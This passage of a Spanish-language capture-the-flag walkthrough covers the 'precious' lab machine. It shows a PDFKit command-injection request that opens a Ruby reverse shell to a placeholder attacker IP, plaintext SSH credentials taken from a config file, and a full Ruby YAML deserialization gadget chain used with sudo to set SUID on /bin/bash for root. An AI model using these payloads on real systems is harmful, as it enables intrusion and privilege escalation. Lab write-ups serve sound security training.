style="color:#e6db74">&#39;url=http%3A%2F%2FLOCAL-ADDRESS%3ALOCAL-PORT%2F%3Fname%3D%2520%60+ruby+-rsocket+-e%27spawn%28%22sh%22%2C%5B%3Ain%2C%3Aout%2C%3Aerr%5D%3D%3ETCPSocket.new%28%22AQUI_PON_TU_IP%22%2CAQUI_PON_EL_PUERTO%29%29%27%60&#39;</span>  
+</span></span><span style="display:flex;"><span>Warning: Binary output can mess up your terminal. Use <span style="color:#e6db74">&#34;--output -&#34;</span> to tell 
+</span></span><span style="display:flex;"><span>Warning: curl to output it to your terminal anyway, or consider <span style="color:#e6db74">&#34;--output 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Warning: &lt;FILE&gt;&#34;</span> to save to a file.
+</span></span></code></pre></div><ul>
+<li>Resultado:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nc -nvlp <span style="color:#ae81ff">443</span>         
+</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">443</span> ...
+</span></span><span style="display:flex;"><span>connect to <span style="color:#f92672">[</span>Tu_IP<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.10.11.189<span style="color:#f92672">]</span> <span style="color:#ae81ff">34916</span>
+</span></span><span style="display:flex;"><span>whoami
+</span></span><span style="display:flex;"><span>ruby
+</span></span><span style="display:flex;"><span>id
+</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>1001<span style="color:#f92672">(</span>ruby<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1001<span style="color:#f92672">(</span>ruby<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1001<span style="color:#f92672">(</span>ruby<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>Estamos dentro otra vez. Diría que busquemos la flag, pero no somos usuarios, vamos a buscar que cosillas encontramos aquí.</p>
+<h2 id="Post">Post Explotación</h2>
+<h3 id="Ruby">Enumeración de Usuario Ruby</h3>
+<p>Para no mostrar todo lo que vi, que es inútil, voy a poner solo lo interesante.</p>
+<p>Entramos en la carpeta <strong>/home</strong> para ver si podemos ver la flag, que te recuerdo, no vamos a poder verla:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cd /home
+</span></span><span style="display:flex;"><span>ls
+</span></span><span style="display:flex;"><span>henry  
+</span></span><span style="display:flex;"><span>ruby
+</span></span><span style="display:flex;"><span>cd henry        
+</span></span><span style="display:flex;"><span>ls
+</span></span><span style="display:flex;"><span>user.txt
+</span></span><span style="display:flex;"><span>cat user.txt
+</span></span><span style="display:flex;"><span>cat: user.txt: Permission denied
+</span></span></code></pre></div><p>Tenemos un usuario, pero no tenemos la contraseña, vamos a ver si hay directorios ocultos de <strong>Ruby</strong> porque del usuario no podremos verlos:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cd ruby
+</span></span><span style="display:flex;"><span>ls -la
+</span></span><span style="display:flex;"><span>total <span style="color:#ae81ff">28</span>
+</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">4</span> ruby ruby <span style="color:#ae81ff">4096</span> Apr <span style="color:#ae81ff">10</span> 14:08 .
+</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">4</span> root root <span style="color:#ae81ff">4096</span> Oct <span style="color:#ae81ff">26</span> 08:28 ..
+</span></span><span style="display:flex;"><span>lrwxrwxrwx <span style="color:#ae81ff">1</span> root root    <span style="color:#ae81ff">9</span> Oct <span style="color:#ae81ff">26</span> 07:53 .bash_history -&gt; /dev/null
+</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> ruby ruby  <span style="color:#ae81ff">220</span> Mar <span style="color:#ae81ff">27</span>  <span style="color:#ae81ff">2022</span> .bash_logout
+</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> ruby ruby <span style="color:#ae81ff">3526</span> Mar <span style="color:#ae81ff">27</span>  <span style="color:#ae81ff">2022</span> .bashrc
+</span></span><span style="display:flex;"><span>dr-xr-xr-x <span style="color:#ae81ff">2</span> root ruby <span style="color:#ae81ff">4096</span> Oct <span style="color:#ae81ff">26</span> 08:28 .bundle
+</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">3</span> ruby ruby <span style="color:#ae81ff">4096</span> Apr <span style="color:#ae81ff">10</span> 14:08 .cache
+</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> ruby ruby  <span style="color:#ae81ff">807</span> Mar <span style="color:#ae81ff">27</span>  <span style="color:#ae81ff">2022</span> .profile
+</span></span></code></pre></div><p>Muy bien, si tratamos de ver todos, el que contendrá la contraseña y el usuario, será el directorio oculto <strong>.bundle</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cd .bundle
+</span></span><span style="display:flex;"><span>ls -la
+</span></span><span style="display:flex;"><span>total <span style="color:#ae81ff">12</span>
+</span></span><span style="display:flex;"><span>dr-xr-xr-x <span style="color:#ae81ff">2</span> root ruby <span style="color:#ae81ff">4096</span> Oct <span style="color:#ae81ff">26</span> 08:28 .
+</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">4</span> ruby ruby <span style="color:#ae81ff">4096</span> Apr <span style="color:#ae81ff">10</span> 14:08 ..
+</span></span><span style="display:flex;"><span>-r-xr-xr-x <span style="color:#ae81ff">1</span> root ruby   <span style="color:#ae81ff">62</span> Sep <span style="color:#ae81ff">26</span>  <span style="color:#ae81ff">2022</span> config
+</span></span></code></pre></div><p>Excelente, veamos que dice ese archivo <strong>config</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat config
+</span></span><span style="display:flex;"><span>---
+</span></span><span style="display:flex;"><span>BUNDLE_HTTPS://RUBYGEMS__ORG/: <span style="color:#e6db74">&#34;henry:Q3c1AqGHtoI0aXAYFH&#34;</span>
+</span></span><span style="display:flex;"><span>exit
+</span></span></code></pre></div><p>Muy bien, tenemos la contraseña del <strong>usuario henry</strong>.</p>
+<p>Es momento de entrar a la máquina por el <strong>servicio SSH</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ssh henry@10.10.11.189              
+</span></span><span style="display:flex;"><span>The authenticity of host <span style="color:#e6db74">&#39;10.10.11.189 (10.10.11.189)&#39;</span> can<span style="color:#e6db74">&#39;t be established.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">ED25519 key fingerprint is SHA256:1WpIxI8qwKmYSRdGtCjweUByFzcn0MSpKgv+AwWRLkU.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">This key is not known by any other names.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Warning: Permanently added &#39;</span>10.10.11.189<span style="color:#e6db74">&#39; (ED25519) to the list of known hosts.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">henry@10.10.11.189&#39;</span>s password: 
+</span></span><span style="display:flex;"><span>Linux precious 5.10.0-19-amd64 <span style="color:#75715e">#1 SMP Debian 5.10.149-2 (2022-10-21) x86_64</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>The programs included with the Debian GNU/Linux system are free software;
+</span></span><span style="display:flex;"><span>the exact distribution terms <span style="color:#66d9ef">for</span> each program are described in the
+</span></span><span style="display:flex;"><span>individual files in /usr/share/doc/*/copyright.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+</span></span><span style="display:flex;"><span>permitted by applicable law.
+</span></span><span style="display:flex;"><span>henry@precious:~$ whoami
+</span></span><span style="display:flex;"><span>henry
+</span></span><span style="display:flex;"><span>henry@precious:~$ ls -la
+</span></span><span style="display:flex;"><span>total <span style="color:#ae81ff">24</span>
+</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">2</span> henry henry <span style="color:#ae81ff">4096</span> Oct <span style="color:#ae81ff">26</span> 08:28 .
+</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">4</span> root  root  <span style="color:#ae81ff">4096</span> Oct <span style="color:#ae81ff">26</span> 08:28 ..
+</span></span><span style="display:flex;"><span>lrwxrwxrwx <span style="color:#ae81ff">1</span> root  root     <span style="color:#ae81ff">9</span> Sep <span style="color:#ae81ff">26</span>  <span style="color:#ae81ff">2022</span> .bash_history -&gt; /dev/null
+</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> henry henry  <span style="color:#ae81ff">220</span> Sep <span style="color:#ae81ff">26</span>  <span style="color:#ae81ff">2022</span> .bash_logout
+</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> henry henry <span style="color:#ae81ff">3526</span> Sep <span style="color:#ae81ff">26</span>  <span style="color:#ae81ff">2022</span> .bashrc
+</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> henry henry  <span style="color:#ae81ff">807</span> Sep <span style="color:#ae81ff">26</span>  <span style="color:#ae81ff">2022</span> .profile
+</span></span><span style="display:flex;"><span>-rw-r----- <span style="color:#ae81ff">1</span> root  henry   <span style="color:#ae81ff">33</span> Apr <span style="color:#ae81ff">10</span> 13:40 user.txt
+</span></span><span style="display:flex;"><span>henry@precious:~$ cat user.txt
+</span></span></code></pre></div><h3 id="post">Enumeración de Usuario Henry</h3>
+<p>Veamos que podemos hacer como el <strong>usuario henry</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>henry@precious:~$ id
+</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>henry<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>henry<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>henry<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>henry@precious:~$ sudo -l
+</span></span><span style="display:flex;"><span>Matching Defaults entries <span style="color:#66d9ef">for</span> henry on precious:
+</span></span><span style="display:flex;"><span>    env_reset, mail_badpass, secure_path<span style="color:#f92672">=</span>/usr/local/sbin<span style="color:#ae81ff">\:</span>/usr/local/bin<span style="color:#ae81ff">\:</span>/usr/sbin<span style="color:#ae81ff">\:</span>/usr/bin<span style="color:#ae81ff">\:</span>/sbin<span style="color:#ae81ff">\:</span>/bin
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>User henry may run the following commands on precious:
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rb
+</span></span></code></pre></div><p>Tenemos acceso a un archivo que tiene permiso como Root que esta hecho en <strong>Ruby</strong>. Vamos a analizarlo:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>henry@precious:~$ cd /opt
+</span></span><span style="display:flex;"><span>henry@precious:/opt$ ls
+</span></span><span style="display:flex;"><span>sample  update_dependencies.rb
+</span></span><span style="display:flex;"><span>henry@precious:/opt$ cat update_dependencies.rb
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Compare installed dependencies with those specified in &#34;dependencies.yml&#34;</span>
+</span></span><span style="display:flex;"><span>require <span style="color:#e6db74">&#34;yaml&#34;</span>
+</span></span><span style="display:flex;"><span>require <span style="color:#e6db74">&#39;rubygems&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># TODO: update versions automatically</span>
+</span></span><span style="display:flex;"><span>def update_gems<span style="color:#f92672">()</span>
+</span></span><span style="display:flex;"><span>end
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>def list_from_file
+</span></span><span style="display:flex;"><span>    YAML.load<span style="color:#f92672">(</span>File.read<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;dependencies.yml&#34;</span><span style="color:#f92672">))</span>
+</span></span><span style="display:flex;"><span>end
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>def list_local_gems
+</span></span><span style="display:flex;"><span>    Gem::Specification.sort_by<span style="color:#f92672">{</span> |g| <span style="color:#f92672">[</span>g.name.downcase, g.version<span style="color:#f92672">]</span> <span style="color:#f92672">}</span>.map<span style="color:#f92672">{</span>|g| <span style="color:#f92672">[</span>g.name, g.version.to_s<span style="color:#f92672">]}</span>
+</span></span><span style="display:flex;"><span>end
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>gems_file <span style="color:#f92672">=</span> list_from_file
+</span></span><span style="display:flex;"><span>gems_local <span style="color:#f92672">=</span> list_local_gems
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>gems_file.each <span style="color:#66d9ef">do</span> |file_name, file_version|
+</span></span><span style="display:flex;"><span>    gems_local.each <span style="color:#66d9ef">do</span> |local_name, local_version|
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span><span style="color:#f92672">(</span>file_name <span style="color:#f92672">==</span> local_name<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span><span style="color:#f92672">(</span>file_version !<span style="color:#f92672">=</span> local_version<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>                puts <span style="color:#e6db74">&#34;Installed version differs from the one specified in file: &#34;</span> + local_name
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">else</span>
+</span></span><span style="display:flex;"><span>                puts <span style="color:#e6db74">&#34;Installed version is equals to the one specified in file: &#34;</span> + local_name
+</span></span><span style="display:flex;"><span>            end
+</span></span><span style="display:flex;"><span>        end
+</span></span><span style="display:flex;"><span>    end
+</span></span><span style="display:flex;"><span>end
+</span></span></code></pre></div><p>Por lo que entiendo, este script en <strong>Ruby</strong>, utiliza un archivo llamado <strong>dependencies.yml</strong> para poder instalar o actualizar la versión de <strong>Ruby</strong> creo.</p>
+<p>Dicho archivo de <strong>.yml</strong> es creado con la <strong>librería YAML</strong>, entonces vamos a buscar un Exploit para <strong>YAML</strong>.</p>
+<h3 id="yaml">Aplicando YAML Deserialization Attack</h3>
+<p>Encontré algo llamado <strong>YAML Deserialization</strong>:</p>
+<table>
+	<thead>
+			<tr>
+					<th style="text-align: center"><strong>YAML Deserialization</strong></th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td style="text-align: center"><em>Se pueden crear payloads personalizados utilizando módulos YAML de Python como PyYAML o ruamel.yaml. Estos payloads pueden explotar vulnerabilidades en sistemas que deserializan entradas no confiables sin una sanitización adecuada.</em></td>
+			</tr>
+	</tbody>
+</table>
+<p>Para más información:</p>
+<ul>
+<li><a href="https://book.hacktricks.xyz/v/es/pentesting-web/deserialization/python-yaml-deserialization" target="_blank">HackTricks: Python Yaml Deserialization</a></li>
+</ul>
+<p>Pero la siguiente página lo explica mejor:</p>
+<ul>
+<li><a href="https://blog.stratumsecurity.com/2021/06/09/blind-remote-code-execution-through-yaml-deserialization/" target="_blank">Blind Remote Code Execution through YAML Deserialization</a></li>
+</ul>
+<p>En resumen, vamos a utilizar la <strong>librería YAML</strong> para ejecutar código malicioso, al momento de que se valide el script <strong>dependencies.yml</strong>. Para hacer esto, debemos crear un archivo del mismo nombre y poner lo siguiente:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>  !ruby/object:Gem::Installer
+</span></span><span style="display:flex;"><span>     i: x
+</span></span><span style="display:flex;"><span>  !ruby/object:Gem::SpecFetcher
+</span></span><span style="display:flex;"><span>     i: y
+</span></span><span style="display:flex;"><span>  !ruby/object:Gem::Requirement
+</span></span><span style="display:flex;"><span>   requirements:
+</span></span><span style="display:flex;"><span>     !ruby/object:Gem::Package::TarReader
+</span></span><span style="display:flex;"><span>     io: &amp;<span style="color:#ae81ff">1</span> !ruby/object:Net::BufferedIO
+</span></span><span style="display:flex;"><span>       io: &amp;<span style="color:#ae81ff">1</span> !ruby/object:Gem::Package::TarReader::Entry
+</span></span><span style="display:flex;"><span>          read: <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>          header: <span style="color:#e6db74">&#34;abc&#34;</span>
+</span></span><span style="display:flex;"><span>       debug_output: &amp;<span style="color:#ae81ff">1</span> !ruby/object:Net::WriteAdapter
+</span></span><span style="display:flex;"><span>          socket: &amp;<span style="color:#ae81ff">1</span> !ruby/object:Gem::RequestSet
+</span></span><span style="display:flex;"><span>              sets: !ruby/object:Net::WriteAdapter
+</span></span><span style="display:flex;"><span>                  socket: !ruby/module <span style="color:#e6db74">&#39;Kernel&#39;</span>
+</span></span><span style="display:flex;"><span>                  method_id: :system
+</span></span><span style="display:flex;"><span>              git_set: sleep <span style="color:#ae81ff">600</span>
+</span></span><span style="display:flex;"><span>          method_id: :resolve
+</span></span></code></pre></div><p>Ahora, el que hará la movida para ejecutar código, será este <strong>git_set:</strong>.</p>
+<p>Hagamos una prueba con tal de ver como funciona, vamos por pasos:</p>
+<ul>
+<li>Creamos el archivo <strong>dependencies.yml</strong>, OJO, esto solo podremos hacer en la carpeta <strong>henry</strong>:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>henry@precious:/home$ pwd
+</span></span><span style="display:flex;"><span>/home/henry
+</span></span><span style="display:flex;"><span>henry@precious:~$ nano dependencies.yml
+</span></span></code></pre></div><ul>
+<li>Dentro del archivo ponemos el script de arriba y cambiamos el <strong>git_set</strong> por un <strong>whoami</strong> para ver si nos suelta algo:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>  !ruby/object:Gem::Installer
+</span></span><span style="display:flex;"><span>     i: x
+</span></span><span style="display:flex;"><span>  !ruby/object:Gem::SpecFetcher
+</span></span><span style="display:flex;"><span>     i: y
+</span></span><span style="display:flex;"><span>  !ruby/object:Gem::Requirement
+</span></span><span style="display:flex;"><span>   requirements:
+</span></span><span style="display:flex;"><span>     !ruby/object:Gem::Package::TarReader
+</span></span><span style="display:flex;"><span>     io: &amp;<span style="color:#ae81ff">1</span> !ruby/object:Net::BufferedIO
+</span></span><span style="display:flex;"><span>       io: &amp;<span style="color:#ae81ff">1</span> !ruby/object:Gem::Package::TarReader::Entry
+</span></span><span style="display:flex;"><span>          read: <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>          header: <span style="color:#e6db74">&#34;abc&#34;</span>
+</span></span><span style="display:flex;"><span>       debug_output: &amp;<span style="color:#ae81ff">1</span> !ruby/object:Net::WriteAdapter
+</span></span><span style="display:flex;"><span>          socket: &amp;<span style="color:#ae81ff">1</span> !ruby/object:Gem::RequestSet
+</span></span><span style="display:flex;"><span>              sets: !ruby/object:Net::WriteAdapter
+</span></span><span style="display:flex;"><span>                  socket: !ruby/module <span style="color:#e6db74">&#39;Kernel&#39;</span>
+</span></span><span style="display:flex;"><span>                  method_id: :system
+</span></span><span style="display:flex;"><span>              git_set: whoami
+</span></span><span style="display:flex;"><span>          method_id: :resolve
+</span></span></code></pre></div><ul>
+<li>Ejecutamos el script con <strong>permisos SUDO</strong> y veamos que pasa:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>henry@precious:~$ sudo /usr/bin/ruby /opt/update_dependencies.rb
+</span></span><span style="display:flex;"><span>sh: 1: reading: not found
+</span></span><span style="display:flex;"><span>root
+</span></span><span style="display:flex;"><span>Traceback <span style="color:#f92672">(</span>most recent call last<span style="color:#f92672">)</span>:
+</span></span><span style="display:flex;"><span>        33: from /opt/update_dependencies.rb:17:in <span style="color:#e6db74">`</span>&lt;main&gt;<span style="color:#e6db74">&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        32: from /opt/update_dependencies.rb:10:in `list_from_file&#39;</span>
+</span></span><span style="display:flex;"><span>        31: from /usr/lib/ruby/2.7.0/psych.rb:279:in <span style="color:#e6db74">`</span>load<span style="color:#e6db74">&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        30: from /usr/lib/ruby/2.7.0/psych/nodes/node.rb:50:in `to_ruby&#39;</span>
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><p>Vaya, vaya, vemos que ahí dice <strong>Root</strong>.</p>
+<ul>
+<li>Hagamos otra prueba, ahora en vez de usar <strong>whoami</strong> pongamos <strong>id</strong>:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>henry@precious:~$ sudo /usr/bin/ruby /opt/update_dependencies.rb
+</span></span><span style="display:flex;"><span>sh: 1: reading: not found
+</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Traceback <span style="color:#f92672">(</span>most recent call last<span style="color:#f92672">)</span>:
+</span></span><span style="display:flex;"><span>        33: from /opt/update_dependencies.rb:17:in <span style="color:#e6db74">`</span>&lt;main&gt;<span style="color:#e6db74">&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        32: from /opt/update_dependencies.rb:10:in `list_from_file&#39;</span>
+</span></span><span style="display:flex;"><span>        31: from /usr/lib/ruby/2.7.0/psych.rb:279:in <span style="color:#e6db74">`</span>load<span style="color:#960050;background-color:#1e0010">&#39;</span>
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><p>Excelente, con esto podemos escalar privilegios, solo demos permisos de ejecución para la <strong>Bash</strong> a cualquier usuario, esto para ser <strong>Root</strong>.</p>
+<p>Hagámoslo por pasos:</p>
+<ul>
+<li>Antes veamos que permisos tiene la <strong>Bash</strong>:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>henry@precious:~$ ls -la /bin/bash
+</span></span><span style="display:flex;"><span>-rwxr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">1234376</span> Mar <span style="color:#ae81ff">27</span>  <span style="color:#ae81ff">2022</span> /bin/bash
+</span></span></code></pre></div><ul>
+<li>Ahora agreguemos el cambio al script para cambiar los permisos:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>       socket: !ruby/module <span style="color:#e6db74">&#39;Kernel&#39;</span>
+</span></span><span style="display:flex;"><span>                  method_id: :system
+</span></span><span style="display:flex;"><span>              git_set: chmod +s /bin/bash
+</span></span><span style="display:flex;"><span>          method_id: :resolve
+</span></span></code></pre></div><ul>
+<li>Ejecutamos el script con <strong>SUDO</strong>:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>henry@precious:~$ sudo /usr/bin/ruby /opt/update_dependencies.rb
+</span></span><span style="display:flex;"><span>sh: 1: reading: not found
+</span></span><span style="display:flex;"><span>Traceback <span style="color:#f92672">(</span>most recent call last<span style="color:#f92672">)</span>:
+</span></span><span style="display:flex;"><span>        33: from /opt/update_dependencies.rb:17:in <span style="color:#e6db74">`</span>&lt;main&gt;<span style="color:#e6db74">&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        32: from /opt/update_dependencies.rb:10:in `list_from_file&#39;</span>
+</span></span><span style="display:flex;"><span>        31: from /usr/lib/ruby/2.7.0/psych.rb:279:in <span style="color:#e6db74">`</span>load<span style="color:#960050;background-color:#1e0010">&#39;</span>
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><ul>
+<li>Comprobamos si se hizo el cambio:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ls -la /bin/bash
+</span></span><span style="display:flex;"><span>-rwsr-sr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">1234376</span> Mar <span style="color:#ae81ff">27</span>  <span style="color:#ae81ff">2022</span> /bin/bash
+</span></span></code></pre></div><ul>
+<li>¡Si se hizo!, entremos a la <strong>Bash</strong> y busquemos la flag:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>henry@precious:~$ bash -p
+</span></span><span style="display:flex;"><span>bash-5.1# whoami
+</span></span><span style="display:flex;"><span>root
+</span></span><span style="display:flex;"><span>bash-5.1# ls
+</span></span><span style="display:flex;"><span>dependencies.yml  user.txt
+</span></span><span style="display:flex;"><span>bash-5.1# cd /root
+</span></span><span style="display:flex;"><span>bash-5.1# ls
+</span></span><span style="display:flex;"><span>root.txt
+</span></span><span style="display:flex;"><span>bash-5.1# cat root.txt
+</span></span></code></pre></div><p>Y listo, ya tenemos las flags.</p>
+
+
+    
+    <h2 id="links-de-investigacion">Links de investigación</h2>
+    <ul>
+      <li><a href="https://github.com/shamo0/PDFkit-CMD-Injection" target="_blank" rel="noopener noreferrer">https://github.com/shamo0/PDFkit-CMD-Injection</a></li><li><a href="https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795" target="_blank" rel="noopener noreferrer">https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795</a></li><li><a href="https://github.com/UNICORDev/exploit-CVE-2022-25765" target="_blank" rel="noopener noreferrer">https://github.com/UNICORDev/exploit-CVE-2022-25765</a></li><li><a href="https://blog.stratumsecurity.com/2021/06/09/blind-remote-code-execution-through-yaml-deserialization/" target="_blank" rel="noopener noreferrer">https://blog.stratumsecurity.com/2021/06/09/blind-remote-code-execution-through-yaml-deserialization/</a></li><li><a href="https://portswigger.net/web-security/request-smuggling" target="_blank" rel="noopener noreferrer">https://portswigger.net/web-security/request-smuggling</a></li><li><a href="https://snyk.io/test/docker/nginx%3A1.18.0" target="_blank" rel="noopener noreferrer">https://snyk.io/test/docker/nginx%3A1.18.0</a></li><li><a href="https://vuldb.com/?id.155282" target="_blank" rel="noopener noreferrer">https://vuldb.com/?id.155282</a></li><li><a href="https://book.hacktricks.xyz/v/es/pentesting-web/deserialization/python-yaml-deserialization" target="_blank" rel="noopener noreferrer">https://book.hacktricks.xyz/v/es/pentesting-web/deserialization/python-yaml-deserialization</a></li><li><a href="https://es.wikipedia.org/wiki/Nginx" target="_blank" rel="noopener noreferrer">https://es.wikipedia.org/wiki/Nginx</a></li><li><a href="https://www.phusionpassenger.com/docs/tutorials/what_is_passenger/" target="_blank" rel="noopener noreferrer">https://www.phusionpassenger.com/docs/tutorials/what_is_passenger/</a></li><li><a href="https://kodigo.org/hablemos-de-ruby-on-rails-ruby-on-rails-que-es-y-para-que-sirve/" target="_blank" rel="noopener 